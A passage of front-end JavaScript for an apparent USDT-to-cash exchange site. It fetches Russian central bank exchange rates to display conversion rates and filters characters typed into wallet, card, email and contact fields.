        if (result.status === 200 && result.ok) {
            return result.json()
        }
    }).then((JSON_DATA) => {
        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();

            if ( cashFirstValute == 'Tether TRC20 (USDT)' && cashSecondValute == 'Наличные RUB' ) {
                document.querySelector('.cash__rate').textContent = `1 USDT = ${data.Valute.USD.Value} RUB`;
                document.querySelector('.last__card h6').textContent = `1 USDT : ${data.Valute.USD.Value} RUB`;
            } else if ( cashFirstValute == 'Tether TRC20 (USDT)' && cashSecondValute == 'Наличные USD' ) {
                document.querySelector('.cash__rate').textContent = `${PRICE_USDT} USDT = 1 USD`;
                document.querySelector('.last__card h6').textContent = `${PRICE_USDT} USDT : 1 USD`;
            } else if ( cashFirstValute == 'Tether TRC20 (USDT)' && cashSecondValute == 'Наличные EUR' ) {
                document.querySelector('.cash__rate').textContent = `${( ( PRICE_USDT / data.Valute.EUR.Value ) * 101.28 ).toFixed(4)} USDT = 1 EUR`;
                document.querySelector('.last__card h6').textContent = `${( ( PRICE_USDT / data.Valute.EUR.Value ) * 101.28 ).toFixed(4)} USDT : 1 EUR`;
            } else if ( cashFirstValute == 'Наличные RUB' ) {
                document.querySelector('.cash__rate').textContent = `${(data.Valute.USD.Value * PRICE_USDT).toFixed(4)} RUB = 1 USDT`;
                document.querySelector('.last__card h6').textContent = `${(data.Valute.USD.Value * PRICE_USDT).toFixed(4)} RUB : 1 USDT`;
            } else if ( cashFirstValute == 'Наличные USD' ) {
                document.querySelector('.cash__rate').textContent = `${( Number(PRICE_USDT) * 0.975)} USD = 1 USDT`;
                document.querySelector('.last__card h6').textContent = `${( Number(PRICE_USDT) * 0.975)} USD : 1 USDT`;
            } else if ( cashFirstValute == 'Наличные EUR' ) {
                document.querySelector('.cash__rate').textContent = `1 EUR = ${((JSON_DATA.USDT_EUR.buy_price / data.Valute.USD.Value) * 101.28).toFixed(4)} USDT`;
                document.querySelector('.last__card h6').textContent = `1 EUR : ${((JSON_DATA.USDT_EUR.buy_price / data.Valute.USD.Value) * 101.28).toFixed(4)} USDT`;
            }
        
        }
        getCurrencies();
    }).catch((error) => {
        console.error('Ошибка получения списка: ', error);
    })

}
whatValuteOnCash();

document.querySelectorAll('.first__val')[1].addEventListener('click', event => {
    secondsCashTimer = 30;
})

document.querySelector('.rec__wallet input').addEventListener("input", (event) => {
    if ( document.querySelector('.rec__title-namewallet').textContent.includes('Кошелек') ) {
        document.querySelector('.rec__wallet input').value = document.querySelector('.rec__wallet input').value.replace(/[йцукенгшщзхъфывапролдячсмитьбюжэ!@#$%^№&*()_=,.?'"`;:/|\-+ ]/gim, "");
    } else if ( document.querySelector('.rec__title-namewallet').textContent.includes('Номер телефона') ) {
        document.querySelector('.rec__wallet input').value = document.querySelector('.rec__wallet input').value.replace(/[йцукенгшщзхъфывапролдячсмитьбюжэ!@#$%^№&*()_=,.?'"`;:/|\- ]/gim, "");
    } else if ( document.querySelector('.rec__title-namewallet').textContent.includes('Карта') ) {
        document.querySelector('.rec__wallet input').value = document.querySelector('.rec__wallet input').value.replace(/[qwertyuiopasdfghjklzxcvbnmйцукенгшщзхъфывапролдячсмитьбюжэ!@#$%^№&*()_=,.?'"`;:/|\- ]/gim, "");
    }
});

document.querySelector('.rec__mail input').addEventListener("input", (event) => {
    document.querySelector('.rec__mail input').value = document.querySelector('.rec__mail input').value.replace(/[йцукенгшщзхъфывапролдячсмитьбюжэ!#$%^&*№()_=,?'"`;:/|\- ]/gim, "");
});

document.querySelector('.rec__tage input').addEventListener("input", (event) => {
    document.querySelector('.rec__tage input').value = document.querySelector('.rec__tage input').value.replace(/[qwertyuiopasdfghjklzxcvbnmйцукенгшщзхъфывапролдячсмитьбюжэ!#@.$%^&*№()_=,?'"`;:/|\- ]/gim, "");
});

const inputCode3 = document.querySelector(".cash__first-input");
inputCode3.addEventListener("input", (event) => {
    inputCode3.value = inputCode3.value.replace(/[qwertyuiopasdfghjklzxcvbnmйцукенгшщзхъфывапролдячсмитьбюжэ!@#№$%^&*()_+=,?'"`;:/|\- ]/gim, "");
});

const inputCode4 = document.querySelector(".cash__second-input");
inputCode4.addEventListener("input", (event) => {
    inputCode4.value = inputCode4.value.replace(/[qwertyuiopasdfghjklzxcvbnmйцукенгшщзхъфывапролдячсмитьбюжэ!@#№$%^&*()_+=,?'"`;:/|\- ]/gim, "");
});

document.querySelector('.cash__user-input').addEventListener("input", (event) => {
    document.querySelector('.cash__user-input').value = document.querySelector('.cash__user-input').value.replace(/[qwertyuiopasdfghjklzxcvbnm0123456789@.!#$%^&*№()_=,?'"`;:/|\-+ ]/gim, "");
});

document.querySelector('.cash__email-input').addEventListener("input", (event) => {
    document.querySelector('.cash__email-input').value = document.querySelector('.cash__email-input').value.replace(/[йцукенгшщзхъфывапролдячсмитьбюжэ!#$%^&*№()_=,?'"`;:/|\-+ ]/gim, "");
});

document.querySelector('.cash__contact-input').addEventListener("input", (event) => {
    document.querySelector('.cash__contact-input').value = document.querySelector('.cash__contact-input').value.replace(/[йцукенгшщзхъфывапролдячсмитьбюжэ!#$%^&*№()_=,.?'"`;:/|\- ]/gim, "");

});
